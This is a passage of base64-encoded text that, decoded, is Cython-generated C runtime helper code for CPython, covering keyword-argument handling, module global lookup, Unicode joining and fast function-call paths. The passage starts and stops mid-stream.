Hl4X0dldEt3VmFsdWVfRkFTVENBTEwoUHlPYmplY3QgKmt3bmFtZXMsIFB5T2JqZWN0ICpjb25zdCAqa3d2YWx1ZXMsIFB5T2JqZWN0ICpzKQp7CiAgICBQeV9zc2l6ZV90IGksIG4gPSBfX1B5eF9QeVR1cGxlX0dFVF9TSVpFKGt3bmFtZXMpOwogICAgI2lmICFDWVRIT05fQVNTVU1FX1NBRkVfU0laRQogICAgaWYgKHVubGlrZWx5KG4gPT0gLTEpKSByZXR1cm4gTlVMTDsKICAgICNlbmRpZgogICAgZm9yIChpID0gMDsgaSA8IG47IGkrKykKICAgIHsKICAgICAgICBQeU9iamVjdCAqbmFtZWkgPSBfX1B5eF9QeVR1cGxlX0dFVF9JVEVNKGt3bmFtZXMsIGkpOwogICAgICAgICNpZiAhQ1lUSE9OX0FTU1VNRV9TQUZFX01BQ1JPUwogICAgICAgIGlmICh1bmxpa2VseSghbmFtZWkpKSByZXR1cm4gTlVMTDsKICAgICAgICAjZW5kaWYKICAgICAgICBpZiAocyA9PSBuYW1laSkgcmV0dXJuIGt3dmFsdWVzW2ldOwogICAgfQogICAgZm9yIChpID0gMDsgaSA8IG47IGkrKykKICAgIHsKICAgICAgICBQeU9iamVjdCAqbmFtZWkgPSBfX1B5eF9QeVR1cGxlX0dFVF9JVEVNKGt3bmFtZXMsIGkpOwogICAgICAgICNpZiAhQ1lUSE9OX0FTU1VNRV9TQUZFX01BQ1JPUwogICAgICAgIGlmICh1bmxpa2VseSghbmFtZWkpKSByZXR1cm4gTlVMTDsKICAgICAgICAjZW5kaWYKICAgICAgICBpbnQgZXEgPSBfX1B5eF9QeVVuaWNvZGVfRXF1YWxzKHMsIG5hbWVpLCBQeV9FUSk7CiAgICAgICAgaWYgKHVubGlrZWx5KGVxICE9IDApKSB7CiAgICAgICAgICAgIGlmICh1bmxpa2VseShlcSA8IDApKSByZXR1cm4gTlVMTDsKICAgICAgICAgICAgcmV0dXJuIGt3dmFsdWVzW2ldOwogICAgICAgIH0KICAgIH0KICAgIHJldHVybiBOVUxMOwp9CiNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0NQWVRIT04gJiYgUFlfVkVSU0lPTl9IRVggPj0gMHgwMzBkMDAwMCB8fCBDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJCkNZVEhPTl9VTlVTRUQgc3RhdGljIFB5T2JqZWN0ICpfX1B5eF9Ld2FyZ3NBc0RpY3RfRkFTVENBTEwoUHlPYmplY3QgKmt3bmFtZXMsIFB5T2JqZWN0ICpjb25zdCAqa3d2YWx1ZXMpIHsKICAgIFB5X3NzaXplX3QgaSwgbmt3YXJnczsKICAgIFB5T2JqZWN0ICpkaWN0OwojaWYgIUNZVEhPTl9BU1NVTUVfU0FGRV9TSVpFCiAgICBua3dhcmdzID0gUHlUdXBsZV9TaXplKGt3bmFtZXMpOwogICAgaWYgKHVubGlrZWx5KG5rd2FyZ3MgPCAwKSkgcmV0dXJuIE5VTEw7CiNlbHNlCiAgICBua3dhcmdzID0gUHlUdXBsZV9HRVRfU0laRShrd25hbWVzKTsKI2VuZGlmCiAgICBkaWN0ID0gUHlEaWN0X05ldygpOwogICAgaWYgKHVubGlrZWx5KCFkaWN0KSkKICAgICAgICByZXR1cm4gTlVMTDsKICAgIGZvciAoaT0wOyBpPG5rd2FyZ3M7IGkrKykgewojaWYgIUNZVEhPTl9BU1NVTUVfU0FGRV9NQUNST1MKICAgICAgICBQeU9iamVjdCAqa2V5ID0gUHlUdXBsZV9HZXRJdGVtKGt3bmFtZXMsIGkpOwogICAgICAgIGlmICgha2V5KSBnb3RvIGJhZDsKI2Vsc2UKICAgICAgICBQeU9iamVjdCAqa2V5ID0gUHlUdXBsZV9HRVRfSVRFTShrd25hbWVzLCBpKTsKI2VuZGlmCiAgICAgICAgaWYgKHVubGlrZWx5KFB5RGljdF9TZXRJdGVtKGRpY3QsIGtleSwga3d2YWx1ZXNbaV0pIDwgMCkpCiAgICAgICAgICAgIGdvdG8gYmFkOwogICAgfQogICAgcmV0dXJuIGRpY3Q7CmJhZDoKICAgIFB5X0RFQ1JFRihkaWN0KTsKICAgIHJldHVybiBOVUxMOwp9CiNlbmRpZgojZW5kaWYKCgojaWYgQ1lUSE9OX1VTRV9ESUNUX1ZFUlNJT05TICYmIENZVEhPTl9VU0VfVFlQRV9TTE9UUwpzdGF0aWMgQ1lUSE9OX0lOTElORSBQWV9VSU5UNjRfVCBfX1B5eF9nZXRfdHBfZGljdF92ZXJzaW9uKFB5T2JqZWN0ICpvYmopIHsKICAgIFB5T2JqZWN0ICpkaWN0ID0gUHlfVFlQRShvYmopLT50cF9kaWN0OwogICAgcmV0dXJuIGxpa2VseShkaWN0KSA/IF9fUFlYX0dFVF9ESUNUX1ZFUlNJT04oZGljdCkgOiAwOwp9CnN0YXRpYyBDWVRIT05fSU5MSU5FIFBZX1VJTlQ2NF9UIF9fUHl4X2dldF9vYmplY3RfZGljdF92ZXJzaW9uKFB5T2JqZWN0ICpvYmopIHsKICAgIFB5T2JqZWN0ICoqZGljdHB0ciA9IE5VTEw7CiAgICBQeV9zc2l6ZV90IG9mZnNldCA9IFB5X1RZUEUob2JqKS0+dHBfZGljdG9mZnNldDsKICAgIGlmIChvZmZzZXQpIHsKI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fQ1BZVEhPTgogICAgICAgIGRpY3RwdHIgPSAobGlrZWx5KG9mZnNldCA+IDApKSA/IChQeU9iamVjdCAqKikgKChjaGFyICopb2JqICsgb2Zmc2V0KSA6IF9QeU9iamVjdF9HZXREaWN0UHRyKG9iaik7CiNlbHNlCiAgICAgICAgZGljdHB0ciA9IF9QeU9iamVjdF9HZXREaWN0UHRyKG9iaik7CiNlbmRpZgogICAgfQogICAgcmV0dXJuIChkaWN0cHRyICYmICpkaWN0cHRyKSA/IF9fUFlYX0dFVF9ESUNUX1ZFUlNJT04oKmRpY3RwdHIpIDogMDsKfQpzdGF0aWMgQ1lUSE9OX0lOTElORSBpbnQgX19QeXhfb2JqZWN0X2RpY3RfdmVyc2lvbl9tYXRjaGVzKFB5T2JqZWN0KiBvYmosIFBZX1VJTlQ2NF9UIHRwX2RpY3RfdmVyc2lvbiwgUFlfVUlOVDY0X1Qgb2JqX2RpY3RfdmVyc2lvbikgewogICAgUHlPYmplY3QgKmRpY3QgPSBQeV9UWVBFKG9iaiktPnRwX2RpY3Q7CiAgICBpZiAodW5saWtlbHkoIWRpY3QpIHx8IHVubGlrZWx5KHRwX2RpY3RfdmVyc2lvbiAhPSBfX1BZWF9HRVRfRElDVF9WRVJTSU9OKGRpY3QpKSkKICAgICAgICByZXR1cm4gMDsKICAgIHJldHVybiBvYmpfZGljdF92ZXJzaW9uID09IF9fUHl4X2dldF9vYmplY3RfZGljdF92ZXJzaW9uKG9iaik7Cn0KI2VuZGlmCgoKI2lmIENZVEhPTl9VU0VfRElDVF9WRVJTSU9OUwpzdGF0aWMgUHlPYmplY3QgKl9fUHl4X19HZXRNb2R1bGVHbG9iYWxOYW1lKFB5T2JqZWN0ICpuYW1lLCBQWV9VSU5UNjRfVCAqZGljdF92ZXJzaW9uLCBQeU9iamVjdCAqKmRpY3RfY2FjaGVkX3ZhbHVlKQojZWxzZQpzdGF0aWMgQ1lUSE9OX0lOTElORSBQeU9iamVjdCAqX19QeXhfX0dldE1vZHVsZUdsb2JhbE5hbWUoUHlPYmplY3QgKm5hbWUpCiNlbmRpZgp7CiAgICBQeU9iamVjdCAqcmVzdWx0OwojaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSQogICAgaWYgKHVubGlrZWx5KCFfX3B5eF9tKSkgewogICAgICAgIGlmICghUHlFcnJfT2NjdXJyZWQoKSkKICAgICAgICAgICAgUHlFcnJfU2V0Tm9uZShQeUV4Y19OYW1lRXJyb3IpOwogICAgICAgIHJldHVybiBOVUxMOwogICAgfQogICAgcmVzdWx0ID0gUHlPYmplY3RfR2V0QXR0cihfX3B5eF9tLCBuYW1lKTsKICAgIGlmIChsaWtlbHkocmVzdWx0KSkgewogICAgICAgIHJldHVybiByZXN1bHQ7CiAgICB9CiAgICBQeUVycl9DbGVhcigpOwojZWxpZiBDWVRIT05fQVZPSURfQk9SUk9XRURfUkVGUyB8fCBDWVRIT05fQVZPSURfVEhSRUFEX1VOU0FGRV9CT1JST1dFRF9SRUZTCiAgICBpZiAodW5saWtlbHkoX19QeXhfUHlEaWN0X0dldEl0ZW1SZWYoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZCwgbmFtZSwgJnJlc3VsdCkgPT0gLTEpKSBQeUVycl9DbGVhcigpOwogICAgX19QWVhfVVBEQVRFX0RJQ1RfQ0FDSEUoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZCwgcmVzdWx0LCAqZGljdF9jYWNoZWRfdmFsdWUsICpkaWN0X3ZlcnNpb24pCiAgICBpZiAobGlrZWx5KHJlc3VsdCkpIHsKICAgICAgICByZXR1cm4gcmVzdWx0OwogICAgfQojZWxzZQogICAgcmVzdWx0ID0gX1B5RGljdF9HZXRJdGVtX0tub3duSGFzaChfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9kLCBuYW1lLCAoKFB5QVNDSUlPYmplY3QgKikgbmFtZSktPmhhc2gpOwogICAgX19QWVhfVVBEQVRFX0RJQ1RfQ0FDSEUoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZCwgcmVzdWx0LCAqZGljdF9jYWNoZWRfdmFsdWUsICpkaWN0X3ZlcnNpb24pCiAgICBpZiAobGlrZWx5KHJlc3VsdCkpIHsKICAgICAgICByZXR1cm4gX19QeXhfTmV3UmVmKHJlc3VsdCk7CiAgICB9CiAgICBQeUVycl9DbGVhcigpOwojZW5kaWYKICAgIHJldHVybiBfX1B5eF9HZXRCdWlsdGluTmFtZShuYW1lKTsKfQoKCiNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0NQWVRIT04Kc3RhdGljIENZVEhPTl9JTkxJTkUgUHlPYmplY3QqIF9fUHl4X1B5T2JqZWN0X0NhbGwoUHlPYmplY3QgKmZ1bmMsIFB5T2JqZWN0ICphcmcsIFB5T2JqZWN0ICprdykgewogICAgUHlPYmplY3QgKnJlc3VsdDsKICAgIHRlcm5hcnlmdW5jIGNhbGwgPSBQeV9UWVBFKGZ1bmMpLT50cF9jYWxsOwogICAgaWYgKHVubGlrZWx5KCFjYWxsKSkKICAgICAgICByZXR1cm4gUHlPYmplY3RfQ2FsbChmdW5jLCBhcmcsIGt3KTsKICAgIGlmICh1bmxpa2VseShQeV9FbnRlclJlY3Vyc2l2ZUNhbGwoIiB3aGlsZSBjYWxsaW5nIGEgUHl0aG9uIG9iamVjdCIpKSkKICAgICAgICByZXR1cm4gTlVMTDsKICAgIHJlc3VsdCA9ICgqY2FsbCkoZnVuYywgYXJnLCBrdyk7CiAgICBQeV9MZWF2ZVJlY3Vyc2l2ZUNhbGwoKTsKICAgIGlmICh1bmxpa2VseSghcmVzdWx0KSAmJiB1bmxpa2VseSghUHlFcnJfT2NjdXJyZWQoKSkpIHsKICAgICAgICBQeUVycl9TZXRTdHJpbmcoCiAgICAgICAgICAgIFB5RXhjX1N5c3RlbUVycm9yLAogICAgICAgICAgICAiTlVMTCByZXN1bHQgd2l0aG91dCBlcnJvciBpbiBQeU9iamVjdF9DYWxsIik7CiAgICB9CiAgICByZXR1cm4gcmVzdWx0Owp9CiNlbmRpZgoKCnN0YXRpYyBQeU9iamVjdCogX19QeXhfUHlVbmljb2RlX0pvaW4oUHlPYmplY3QqKiB2YWx1ZXMsIFB5X3NzaXplX3QgdmFsdWVfY291bnQsIFB5X3NzaXplX3QgcmVzdWx0X3VsZW5ndGgsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgUHlfVUNTNCBtYXhfY2hhcikgewojaWYgQ1lUSE9OX1VTRV9VTklDT0RFX0lOVEVSTkFMUyAmJiBDWVRIT05fQVNTVU1FX1NBRkVfTUFDUk9TICYmICFDWVRIT05fQVZPSURfQk9SUk9XRURfUkVGUwogICAgUHlPYmplY3QgKnJlc3VsdF91dmFsOwogICAgaW50IHJlc3VsdF91a2luZCwga2luZF9zaGlmdDsKICAgIFB5X3NzaXplX3QgaSwgY2hhcl9wb3M7CiAgICB2b2lkICpyZXN1bHRfdWRhdGE7CiAgICBpZiAobWF4X2NoYXIgPiAxMTE0MTExKSBtYXhfY2hhciA9IDExMTQxMTE7CiAgICByZXN1bHRfdXZhbCA9IFB5VW5pY29kZV9OZXcocmVzdWx0X3VsZW5ndGgsIG1heF9jaGFyKTsKICAgIGlmICh1bmxpa2VseSghcmVzdWx0X3V2YWwpKSByZXR1cm4gTlVMTDsKICAgIHJlc3VsdF91a2luZCA9IChtYXhfY2hhciA8PSAyNTUpID8gUHlVbmljb2RlXzFCWVRFX0tJTkQgOiAobWF4X2NoYXIgPD0gNjU1MzUpID8gUHlVbmljb2RlXzJCWVRFX0tJTkQgOiBQeVVuaWNvZGVfNEJZVEVfS0lORDsKICAgIGtpbmRfc2hpZnQgPSAocmVzdWx0X3VraW5kID09IFB5VW5pY29kZV80QllURV9LSU5EKSA/IDIgOiByZXN1bHRfdWtpbmQgLSAxOwogICAgcmVzdWx0X3VkYXRhID0gUHlVbmljb2RlX0RBVEEocmVzdWx0X3V2YWwpOwogICAgYXNzZXJ0KGtpbmRfc2hpZnQgPT0gMiB8fCBraW5kX3NoaWZ0ID09IDEgfHwga2luZF9zaGlmdCA9PSAwKTsKICAgIGlmICh1bmxpa2VseSgoUFlfU1NJWkVfVF9NQVggPj4ga2luZF9zaGlmdCkgLSByZXN1bHRfdWxlbmd0aCA8IDApKQogICAgICAgIGdvdG8gb3ZlcmZsb3c7CiAgICBjaGFyX3BvcyA9IDA7CiAgICBmb3IgKGk9MDsgaSA8IHZhbHVlX2NvdW50OyBpKyspIHsKICAgICAgICBpbnQgdWtpbmQ7CiAgICAgICAgUHlfc3NpemVfdCB1bGVuZ3RoOwogICAgICAgIHZvaWQgKnVkYXRhOwogICAgICAgIFB5T2JqZWN0ICp1dmFsID0gdmFsdWVzW2ldOwogICAgICAgICNpZiAhQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSQogICAgICAgIGlmIChfX1B5eF9QeVVuaWNvZGVfUkVBRFkodXZhbCkgPT0gKC0xKSkKICAgICAgICAgICAgZ290byBiYWQ7CiAgICAgICAgI2VuZGlmCiAgICAgICAgdWxlbmd0aCA9IF9fUHl4X1B5VW5pY29kZV9HRVRfTEVOR1RIKHV2YWwpOwogICAgICAgICNpZiAhQ1lUSE9OX0FTU1VNRV9TQUZFX1NJWkUKICAgICAgICBpZiAodW5saWtlbHkodWxlbmd0aCA8IDApKSBnb3RvIGJhZDsKICAgICAgICAjZW5kaWYKICAgICAgICBpZiAodW5saWtlbHkoIXVsZW5ndGgpKQogICAgICAgICAgICBjb250aW51ZTsKICAgICAgICBpZiAodW5saWtlbHkoKFBZX1NTSVpFX1RfTUFYID4+IGtpbmRfc2hpZnQpIC0gdWxlbmd0aCA8IGNoYXJfcG9zKSkKICAgICAgICAgICAgZ290byBvdmVyZmxvdzsKICAgICAgICB1a2luZCA9IF9fUHl4X1B5VW5pY29kZV9LSU5EKHV2YWwpOwogICAgICAgIHVkYXRhID0gX19QeXhfUHlVbmljb2RlX0RBVEEodXZhbCk7CiAgICAgICAgaWYgKHVraW5kID09IHJlc3VsdF91a2luZCkgewogICAgICAgICAgICBtZW1jcHkoKGNoYXIgKilyZXN1bHRfdWRhdGEgKyAoY2hhcl9wb3MgPDwga2luZF9zaGlmdCksIHVkYXRhLCAoc2l6ZV90KSAodWxlbmd0aCA8PCBraW5kX3NoaWZ0KSk7CiAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgI2lmIFBZX1ZFUlNJT05fSEVYID49IDB4MDMwZDAwMDAKICAgICAgICAgICAgaWYgKHVubGlrZWx5KFB5VW5pY29kZV9Db3B5Q2hhcmFjdGVycyhyZXN1bHRfdXZhbCwgY2hhcl9wb3MsIHV2YWwsIDAsIHVsZW5ndGgpIDwgMCkpIGdvdG8gYmFkOwogICAgICAgICAgICAjZWxpZiBDWVRIT05fQ09NUElMSU5HX0lOX0NQWVRIT04gfHwgZGVmaW5lZChfUHlVbmljb2RlX0Zhc3RDb3B5Q2hhcmFjdGVycykKICAgICAgICAgICAgX1B5VW5pY29kZV9GYXN0Q29weUNoYXJhY3RlcnMocmVzdWx0X3V2YWwsIGNoYXJfcG9zLCB1dmFsLCAwLCB1bGVuZ3RoKTsKICAgICAgICAgICAgI2Vsc2UKICAgICAgICAgICAgUHlfc3NpemVfdCBqOwogICAgICAgICAgICBmb3IgKGo9MDsgaiA8IHVsZW5ndGg7IGorKykgewogICAgICAgICAgICAgICAgUHlfVUNTNCB1Y2hhciA9IF9fUHl4X1B5VW5pY29kZV9SRUFEKHVraW5kLCB1ZGF0YSwgaik7CiAgICAgICAgICAgICAgICBfX1B5eF9QeVVuaWNvZGVfV1JJVEUocmVzdWx0X3VraW5kLCByZXN1bHRfdWRhdGEsIGNoYXJfcG9zK2osIHVjaGFyKTsKICAgICAgICAgICAgfQogICAgICAgICAgICAjZW5kaWYKICAgICAgICB9CiAgICAgICAgY2hhcl9wb3MgKz0gdWxlbmd0aDsKICAgIH0KICAgIHJldHVybiByZXN1bHRfdXZhbDsKb3ZlcmZsb3c6CiAgICBQeUVycl9TZXRTdHJpbmcoUHlFeGNfT3ZlcmZsb3dFcnJvciwgImpvaW4oKSByZXN1bHQgaXMgdG9vIGxvbmcgZm9yIGEgUHl0aG9uIHN0cmluZyIpOwpiYWQ6CiAgICBQeV9ERUNSRUYocmVzdWx0X3V2YWwpOwogICAgcmV0dXJuIE5VTEw7CiNlbHNlCiAgICBQeV9zc2l6ZV90IGk7CiAgICBQeU9iamVjdCAqcmVzdWx0ID0gTlVMTDsKICAgIFB5T2JqZWN0ICp2YWx1ZV90dXBsZSA9IFB5VHVwbGVfTmV3KHZhbHVlX2NvdW50KTsKICAgIGlmICh1bmxpa2VseSghdmFsdWVfdHVwbGUpKSByZXR1cm4gTlVMTDsKICAgIENZVEhPTl9VTlVTRURfVkFSKG1heF9jaGFyKTsKICAgIENZVEhPTl9VTlVTRURfVkFSKHJlc3VsdF91bGVuZ3RoKTsKICAgIGZvciAoaT0wOyBpPHZhbHVlX2NvdW50OyBpKyspIHsKICAgICAgICBpZiAoX19QeXhfUHlUdXBsZV9TRVRfSVRFTSh2YWx1ZV90dXBsZSwgaSwgdmFsdWVzW2ldKSAhPSAoMCkpIGdvdG8gYmFkOwogICAgICAgIFB5X0lOQ1JFRih2YWx1ZXNbaV0pOwogICAgfQogICAgcmVzdWx0ID0gUHlVbmljb2RlX0pvaW4oX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZW1wdHlfdW5pY29kZSwgdmFsdWVfdHVwbGUpOwpiYWQ6CiAgICBQeV9ERUNSRUYodmFsdWVfdHVwbGUpOwogICAgcmV0dXJuIHJlc3VsdDsKI2VuZGlmCn0KCgojaWYgQ1lUSE9OX0ZBU1RfUFlDQUxMICYmICFDWVRIT05fVkVDVE9SQ0FMTApzdGF0aWMgUHlPYmplY3QqIF9fUHl4X1B5RnVuY3Rpb25fRmFzdENhbGxOb0t3KFB5Q29kZU9iamVjdCAqY28sIFB5T2JqZWN0ICpjb25zdCAqYXJncywgUHlfc3NpemVfdCBuYSwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBQeU9iamVjdCAqZ2xvYmFscykgewogICAgUHlGcmFtZU9iamVjdCAqZjsKICAgIFB5VGhyZWFkU3RhdGUgKnRzdGF0ZSA9IF9fUHl4X1B5VGhyZWFkU3RhdGVfQ3VycmVudDsKICAgIFB5T2JqZWN0ICoqZmFzdGxvY2FsczsKICAgIFB5X3NzaXplX3QgaTsKICAgIFB5T2JqZWN0ICpyZXN1bHQ7CiAgICBhc3NlcnQoZ2xvYmFscyAhPSBOVUxMKTsKICAgIAogICAgYXNzZXJ0KHRzdGF0ZSAhPSBOVUxMKTsKICAgIGYgPSBQeUZyYW1lX05ldyh0c3RhdGUsIGNvLCBnbG9iYWxzLCBOVUxMKTsKICAgIGlmIChmID09IE5VTEwpIHsKICAgICAgICByZXR1cm4gTlVMTDsKICAgIH0KICAgIGZhc3Rsb2NhbHMgPSBfX1B5eF9QeUZyYW1lX0dldExvY2Fsc3BsdXMoZik7CiAgICBmb3IgKGkgPSAwOyBpIDwgbmE7IGkrKykgewogICAgICAgIFB5X0lOQ1JFRigqYXJncyk7CiAgICAgICAgZmFzdGxvY2Fsc1tpXSA9ICphcmdzKys7CiAgICB9CiAgICByZXN1bHQgPSBQeUV2YWxfRXZhbEZyYW1lRXgoZiwwKTsKICAgICsrdHN0YXRlLT5yZWN1cnNpb25fZGVwdGg7CiAgICBQeV9ERUNSRUYoZik7CiAgICAtLXRzdGF0ZS0+cmVjdXJzaW9uX2RlcHRoOwogICAgcmV0dXJuIHJlc3VsdDsKfQpzdGF0aWMgUHlPYmplY3QgKl9fUHl4X1B5RnVuY3Rpb25fRmFzdENhbGxEaWN0KFB5T2JqZWN0ICpmdW5jLCBQeU9iamVjdCAqY29uc3QgKmFyZ3MsIFB5X3NzaXplX3QgbmFyZ3MsIFB5T2JqZWN0ICprd2FyZ3MpIHsKICAgIFB5Q29kZU9iamVjdCAqY28gPSAoUHlDb2RlT2JqZWN0ICopUHlGdW5jdGlvbl9HRVRfQ09ERShmdW5jKTsKICAgIFB5T2JqZWN0ICpnbG9iYWxzID0gUHlGdW5jdGlvbl9HRVRfR0xPQkFMUyhmdW5jKTsKICAgIFB5T2JqZWN0ICphcmdkZWZzID0gUHlGdW5jdGlvbl9HRVRfREVGQVVMVFMoZnVuYyk7CiAgICBQeU9iamVjdCAqY2xvc3VyZTsKICAgIFB5T2JqZWN0ICprd2RlZnM7CiAgICBQeU9iamVjdCAqa3d0dXBsZSwgKiprOwogICAgUHlPYmplY3QgKipkOwogICAgUHlfc3NpemVfdCBuZDsKICAgIFB5X3NzaXplX3Qgbms7CiAgICBQeU9iamVjdCAqcmVzdWx0OwogICAgYXNzZXJ0KGt3YXJncyA9PSBOVUxMIHx8IFB5RGljdF9DaGVjayhrd2FyZ3MpKTsKICAgIG5rID0ga3dhcmdzID8gUHlEaWN0X1NpemUoa3dhcmdzKSA6IDA7CiAgICBpZiAodW5saWtlbHkoUHlfRW50ZXJSZWN1cnNpdmVDYWxsKCIgd2hpbGUgY2FsbGluZyBhIFB5dGhvbiBvYmplY3QiKSkpIHsKICAgICAgICByZXR1cm4gTlVMTDsKICAgIH0KICAgIGlmICgKICAgICAgICAgICAgY28tPmNvX2t3b25seWFyZ2NvdW50ID09IDAgJiYKICAgICAgICAgICAgbGlrZWx5KGt3YXJncyA9PSBOVUxMIHx8IG5rID09IDApICYmCiAgICAgICAgICAgIGNvLT5jb19mbGFncyA9PSAoQ09fT1BUSU1JWkVEIHwgQ09fTkVXTE9DQUxTIHwgQ09fTk9GUkVFKSkgewogICAgICAgIGlmIChhcmdkZWZzID09IE5VTEwgJiYgY28tPmNvX2FyZ2NvdW50ID09IG5hcmdzKSB7CiAgICAgICAgICAgIHJlc3VsdCA9IF9fUHl4X1B5RnVuY3Rpb25fRmFzdENhbGxOb0t3KGNvLCBhcmdzLCBuYXJncywgZ2xvYmFscyk7CiAgICAgICAgICAgIGdvdG8gZG9uZTsKICAgICAgICB9CiAgICAgICAgZWxzZSBpZiAobmFyZ3MgPT0gMCAmJiBhcmdkZWZzICE9IE5VTEwKICAgICAgICAgICAgICAgICAmJiBjby0+Y29fYXJnY291bnQgPT0gUHlfU0laRShhcmdkZWZzKSkgewogICAgICAgICAgICAKICAgICAgICAgICAgYXJncyA9ICZQeVR1cGxlX0dFVF9JVEVNKGFyZ2RlZnMsIDApOwogICAgICAgICAgICByZXN1bHQgPV9fUHl4X1B5RnVuY3Rpb25fRmFzdENhbGxOb0t3KGNvLCBhcmdzLCBQeV9TSVpFKGFyZ2RlZnMpLCBnbG9iYWxzKTsKICAgICAgICAgICAgZ290byBkb25lOwogICAgICAgIH0KICAgIH0KICAgIGlmIChrd2FyZ3MgIT0gTlVMTCkgewogICAgICAgIFB5X3NzaXplX3QgcG9zLCBpOwogICAgICAgIGt3dHVwbGUgPSBQeVR1cGxlX05ldygyICogbmspOwogICAgICAgIGlmIChrd3R1cGxlID09IE5VTEwpIHsKICAgICAgICAgICAgcmVzdWx0ID0gTlVMTDsKICAgICAgICAgICAgZ290byBkb25lOwogICAgICAgIH0KICAgICAgICBrID0gJlB5VHVwbGVfR0VUX0lURU0oa3d0dXBsZSwgMCk7CiAgICAgICAgcG9zID0gaSA9IDA7CiAgICAgICAgd2hpbGUgKFB5RGljdF9OZXh0KGt3YXJncywgJnBvcywgJmtbaV0sICZrW2krMV0pKSB7CiAgICAgICAgICAgIFB5X0lOQ1JFRihrW2ldKTsKICAgICAgICAgICAgUHlfSU5DUkVGKGtbaSsxXSk7CiAgICAgICAgICAgIGkgKz0gMjsKICAgICAgICB9CiAgICAgICAgbmsgPSBpIC8gMjsKICAgIH0KICAgIGVsc2UgewogICAgICAgIGt3dHVwbGUgPSBOVUxMOwogICAgICAgIGsgPSBOVUxMOwogICAgfQogICAgY2xvc3VyZSA9IFB5RnVuY3Rpb25fR0VUX0NMT1NVUkUoZnVuYyk7CiAgICBrd2RlZnMgPSBQeUZ1bmN0aW9uX0dFVF9LV19ERUZBVUxUUyhmdW5jKTsKICAgIGlmIChhcmdkZWZzICE9IE5VTEwpIHsKICAgICAgICBkID0gJlB5VHVwbGVfR0VUX0lURU0oYXJnZGVmcywgMCk7CiAgICAgICAgbmQgPSBQeV9TSVpFKGFyZ2RlZnMpOwogICAgfQogICAgZWxzZSB7CiAgICAgICAgZCA9IE5VTEw7CiAgICAgICAgbmQgPSAwOwogICAgfQogICAgcmVzdWx0ID0gUHlFdmFsX0V2YWxDb2RlRXgoKFB5T2JqZWN0KiljbywgZ2xvYmFscywgKFB5T2JqZWN0ICopTlVMTCwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGFyZ3MsIChpbnQpbmFyZ3MsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBrLCAoaW50KW5rLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZCwgKGludCluZCwga3dkZWZzLCBjbG9zdXJlKTsKICAgIFB5X1hERUNSRUYoa3d0dXBsZSk7CmRvbmU6CiAgICBQeV9MZWF2ZVJlY3Vyc2l2ZUNhbGwoKTsKICAgIHJldHVybiByZXN1bHQ7Cn0KI2VuZGlmCgoKI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fQ1BZVEhPTgpzdGF0aWMgQ1lUSE9OX0lOTElORSBQeU9iamVjdCogX19QeXhfUHlPYmplY3RfQ2FsbE1ldGhPKFB5T2JqZWN0ICpmdW5jLCBQeU9iamVjdCAqYXJnKSB7CiAgICBQeU9iamVjdCAqc2VsZiwgKnJlc3VsdDsKICAgIFB5Q0Z1bmN0aW9uIGNmdW5jOwogICAgY2Z1bmMgPSBfX1B5eF9DeU9yUHlDRnVuY3Rpb25fR0VUX0ZVTkNUSU9OKGZ1bmMpOwogICAgc2VsZiA9IF9fUHl4X0N5T3JQeUNGdW5jdGlvbl9HRVRfU0VMRihmdW5jKTsKICAgIGlmICh1bmxpa2VseShQeV9FbnRlclJlY3Vyc2l2ZUNhbGwoIiB3aGlsZSBjYWxsaW5nIGEgUHl0aG9uIG9iamVjdCIpKSkKICAgICAgICByZXR1cm4gTlVMTDsKICAgIHJlc3VsdCA9IGNmdW5jKHNlbGYsIGFyZyk7CiAgICBQeV9MZWF2ZVJlY3Vyc2l2ZUNhbGwoKTsKICAgIGlmICh1bmxpa2VseSghcmVzdWx0KSAmJiB1bmxpa2VseSghUHlFcnJfT2NjdXJyZWQoKSkpIHsKICAgICAgICBQeUVycl9TZXRTdHJpbmcoCiAgICAgICAgICAgIFB5RXhjX1N5c3RlbUVycm9yLAogICAgICAgICAgICAiTlVMTCByZXN1bHQgd2l0aG91dCBlcnJvciBpbiBQeU9iamVjdF9DYWxsIik7CiAgICB9CiAgICByZXR1cm4gcmVzdWx0Owp9CiNlbmRpZgoKCiNpZiBQWV9WRVJTSU9OX0hFWCA8IDB4MDMwOTAwMDAgfHwgQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSQpzdGF0aWMgUHlPYmplY3QqIF9fUHl4X1B5T2JqZWN0X0Zhc3RDYWxsX2ZhbGxiYWNrKFB5T2JqZWN0ICpmdW5jLCBQeU9iamVjdCAqIGNvbnN0KmFyZ3MsIHNpemVfdCBuYXJncywgUHlPYmplY3QgKmt3YXJncykgewogICAgUHlPYmplY3QgKmFyZ3N0dXBsZTsKICAgIFB5T2JqZWN0ICpyZXN1bHQgPSAwOwogICAgc2l6ZV90IGk7CiAgICBhcmdzdHVwbGUgPSBQeVR1cGxlX05ldygoUHlfc3NpemVfdCluYXJncyk7CiAgICBpZiAodW5saWtlbHkoIWFyZ3N0dXBsZSkpIHJldHVybiBOVUxMOwogICAgZm9yIChpID0gMDsgaSA8IG5hcmdzOyBpKyspIHsKICAgICAgICBQeV9JTkNSRUYoYXJnc1tpXSk7CiAgICAgICAgaWYgKF9fUHl4X1B5VHVwbGVfU0VUX0lURU0oYXJnc3R1cGxlLCAoUHlfc3NpemVfdClpLCBhcmdzW2ldKSAhPSAoMCkpIGdvdG8gYmFkOwogICAgfQogICAgcmVzdWx0ID0gX19QeXhfUHlPYmplY3RfQ2FsbChmdW5jLCBhcmdzdHVwbG